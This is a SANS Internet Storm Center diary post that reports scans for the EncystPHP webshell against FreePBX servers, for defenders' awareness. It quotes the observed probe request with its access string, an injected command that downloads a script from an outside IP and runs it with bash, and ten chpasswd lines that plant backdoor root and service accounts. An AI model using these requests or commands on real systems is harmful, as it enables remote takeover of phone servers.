---
title: Scans for EncystPHP Webshell, (Mon, Apr 13th)
url: https://isc.sans.edu/diary/rss/32892
source: SANS Internet Storm Center, InfoCON: green
date: 2026-04-13
fetch_date: 2026-04-14T04:45:58.437064
---

# Scans for EncystPHP Webshell, (Mon, Apr 13th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Xavier Mertens](/handler_list.html#xavier-mertens "Xavier Mertens")

Threat Level: [green](/infocon.html)

* [previous](/diary/32884)

Click [HERE](https://www.sans.org/profiles/dr-johannes-ullrich) to learn more about classes Johannes is teaching for SANS

# [Scans for EncystPHP Webshell](/forums/diary/Scans%2Bfor%2BEncystPHP%2BWebshell/32892/)

**Published**: 2026-04-13. **Last Updated**: 2026-04-13 13:02:50 UTC
**by** [Johannes Ullrich](https://plus.google.com/101587262224166552564?rel=author) (Version: 1)

[0 comment(s)](/diary/Scans%2Bfor%2BEncystPHP%2BWebshell/32892/#comments)

Last week, I wrote about attackers scanning for various webshells, hoping to find some that do not require authentication or others that use well-known credentials. But some attackers are paying attention and are deploying webshells with more difficult-to-guess credentials. Today, I noticed some scans for what appears to be the "EncystPHP" web shell. Fortinet wrote about this webshell back in January. It appears to be a favorite among attackers compromising vulnerable FreePBX systems.

The requests I observed look like:

> `GET /admin/modules/phones/ajax.php?md5=cf710203400b8c466e6dfcafcf36a411
> Host: [victim ip address]:8000
> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
> Accept-Encoding: gzip, deflate
> Accept: */*
> Connection: keep-alive`

This URL matches what [Fortinet reported](https://www.fortinet.com/de/blog/threat-research/unveiling-the-weaponized-web-shell-encystphp) back in January.

The parameter name "md5" is a bit misleading. The webshell will just compare the string. The parameter is not necessarily the MD5 hash of a specific "password"; any string will work as long as it matches the hard-coded string in the webshell. The string above has the correct length for an MD5 hash, but I wasn't able to find it in common MD5 hash databases. It is very possible that only a few different values are used across different attack campaigns. Many attackers may just "copy/paste" the code, including this access secret.

Currently, these probes originate from [160.119.76.250](/ipinfo.html?ip=160.119.76.250), an IP address located in the Netherlands. The IP address hosts an unconfigured web server.

The same IP address is also probing for various FreePBX vulnerabilities, for example:

> `/restapps/applications.php?linestate=$$LINESTATE$$&user=100
> Context: ext-local`
>
> `Action: Originate
> Channel: Local/DONTCALL@macro-dial
> Application: system
> data: wget http://45.95.147.178/k.php -O /tmp/k;bash /tmp/`k

This request also matches the scans reported by Fortinet, and it returns the EncystPHP webshell. This version is also adding the following backdoor accounts:

> `echo 'root:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
> echo 'hima:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
> echo 'asterisk:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
> echo 'sugarmaint:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
> echo 'spamfilter:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
> echo 'asteriskuser:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
> echo 'supports:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
> echo 'freepbxuser:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
> echo 'supermaint:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
> echo 'juba:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true`

If you are using FreePBX, you may want to check for these accounts just to make sure.

--
Johannes B. Ullrich, Ph.D. , Dean of Research, [SANS.edu](https://sans.edu)
[Twitter](https://jbu.me/164)|

Keywords: [freepbx encystphp webshell](/tag.html?tag=freepbx encystphp webshell)

[0 comment(s)](/diary/Scans%2Bfor%2BEncystPHP%2BWebshell/32892/#comments)

Click [HERE](https://www.sans.org/profiles/dr-johannes-ullrich) to learn more about classes Johannes is teaching for SANS

* [previous](/diary/32884)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2026 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)